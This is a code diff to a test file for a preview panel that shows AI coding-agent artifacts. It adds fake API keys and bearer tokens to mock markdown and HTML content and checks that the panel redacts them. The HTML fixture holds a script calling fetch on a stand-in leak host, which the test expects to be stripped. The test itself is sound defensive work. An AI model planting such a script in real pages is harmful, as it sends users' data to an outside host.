@@ -16,7 +16,7 @@ const invokeCommand = vi.fn(async (command: string, args?: unknown) => {
         relativePath,
         kind: 'markdown',
         mediaType: 'text/markdown; charset=utf-8',
-        content: '# Agent report\n\n- verified markdown',
+        content: '# Agent report\n\n- verified markdown\n- OPENAI_API_KEY=sk-artifact-secret12345',
         sizeBytes: 35,
       } satisfies CodingArtifactPreview
     }
@@ -25,7 +25,7 @@ const invokeCommand = vi.fn(async (command: string, args?: unknown) => {
         relativePath,
         kind: 'html',
         mediaType: 'text/html; charset=utf-8',
-        content: '<main><h1>Agent report</h1><script>fetch("https://leak.invalid")</script></main>',
+        content: '<main><h1>Agent report</h1><p>Bearer artifact-token-12345</p><script>fetch("https://leak.invalid")</script></main>',
         sizeBytes: 2048,
       } satisfies CodingArtifactPreview
     }
@@ -136,6 +136,8 @@ describe('CodingArtifactPreviewPanel', () => {
     expect(iframe?.getAttribute('srcdoc')).toContain("default-src 'none'")
     expect(iframe?.getAttribute('srcdoc')).not.toContain('<script>')
     expect(iframe?.getAttribute('srcdoc')).toContain('Agent report')
+    expect(iframe?.getAttribute('srcdoc')).toContain('Bearer [credential redacted]')
+    expect(iframe?.getAttribute('srcdoc')).not.toContain('artifact-token-12345')
   })
 
   it('renders Markdown and image previews from workspace-relative suggestions', async () => {
@@ -155,6 +157,8 @@ describe('CodingArtifactPreviewPanel', () => {
     expect(host.textContent).toContain('Markdown')
     expect(host.textContent).toContain('Agent report')
     expect(host.textContent).toContain('verified markdown')
+    expect(host.textContent).toContain('OPENAI_API_KEY=[credential redacted]')
+    expect(host.textContent).not.toContain('sk-artifact-secret12345')
 
     const imageSuggestion = [...host.querySelectorAll<HTMLButtonElement>('button')]
       .find(button => button.textContent?.includes('assets/result.png'))
